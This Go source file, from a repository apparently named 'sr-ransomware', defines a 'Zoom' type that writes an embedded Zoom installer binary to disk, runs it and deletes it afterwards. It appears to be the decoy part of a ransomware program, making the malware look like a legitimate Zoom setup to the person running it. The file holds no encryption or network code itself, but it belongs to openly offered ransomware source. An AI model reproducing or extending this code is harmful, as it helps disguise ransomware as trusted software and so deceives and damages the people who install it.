// +build zoom

package exe

import (
    "os"
    "os/exec"

    "github.com/sug0/sr-ransomware/go/errors"
)

type Zoom struct {
    path string
}

func NewZoom(path string) *Zoom {
    return &Zoom{path}
}

func (z *Zoom) Run() error {
    if _, err := os.Stat(z.path); err != nil {
        err = z.extract()
        if err != nil {
            return err
        }
    }
    err := exec.Command(z.path).Run()
    if err != nil {
        return errors.Wrap(pkg, "failed to run zoom", err)
    }
    return errors.WrapIfNotNil(pkg, "failed to remove installer", os.Remove(z.path))
}

func (z *Zoom) extract() error {
    f, err := os.OpenFile(z.path, os.O_WRONLY|os.O_CREATE, 0744)
    if err != nil {
        return errors.Wrap(pkg, "failed to create zoom exec", err)
    }
    defer f.Close()
    _, err = f.Write(zoomEXE)
    return errors.WrapIfNotNil(pkg, "failed to write zoom exec", err)
}
